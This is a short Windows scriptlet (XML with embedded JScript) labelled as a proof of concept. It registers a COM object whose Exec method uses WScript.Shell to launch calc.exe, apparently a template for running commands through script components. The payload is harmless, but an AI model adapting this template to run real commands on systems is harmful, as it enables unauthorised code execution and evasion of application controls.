<?XML version="1.0"?>
<scriptlet>
<registration
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
</registration>
<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[
    function Exec() {
        new ActiveXObject("WScript.Shell").Run("calc.exe");
    }
]]>
</script>
</scriptlet>
